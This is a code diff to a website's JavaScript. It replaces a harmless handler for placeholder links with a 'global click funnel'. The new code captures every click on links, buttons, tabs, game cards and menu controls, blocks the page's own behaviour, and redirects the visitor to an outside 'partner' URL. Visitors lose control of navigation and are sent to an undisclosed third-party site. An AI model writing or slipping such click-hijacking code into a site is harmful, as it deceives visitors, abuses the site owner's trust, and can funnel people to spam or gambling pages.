@@ -77,27 +77,26 @@
         });
     }
 
-    // Prevent 404s on placeholder internal links.
-    // Links are kept with real href values for SEO/crawling, but clicking them
-    // does not navigate away from this static demo. External links, anchors
-    // (#...), mailto:/tel: links and the home link ("/") continue to work.
+    // Global click funnel: any click on a link or button on the site
+    // redirects the visitor to the partner landing page.
+    var PARTNER_URL = "https://one-vv289.com/?p=sjjr";
+
     document.addEventListener("click", function (e) {
         if (e.defaultPrevented) return;
         if (e.button !== 0) return;
-        if (e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) return;
 
-        var a = e.target.closest && e.target.closest("a[href]");
-        if (!a) return;
-        if (a.target && a.target !== "" && a.target !== "_self") return;
-
-        var href = a.getAttribute("href");
-        if (!href) return;
-
-        var isExternal = /^[a-z][a-z0-9+.-]*:/i.test(href);
-        if (isExternal) return;
-        if (href.charAt(0) === "#") return;
-        if (href === "/" || href === "") return;
+        var target = e.target.closest && e.target.closest(
+            "a, button, [role='button'], [role='tab'], .game-card, .hero-arrow, .menu-btn, .lang-btn"
+        );
+        if (!target) return;
 
         e.preventDefault();
-    });
+        e.stopPropagation();
+
+        if (e.metaKey || e.ctrlKey || e.shiftKey) {
+            window.open(PARTNER_URL, "_blank", "noopener");
+        } else {
+            window.location.href = PARTNER_URL;
+        }
+    }, true);
 })();
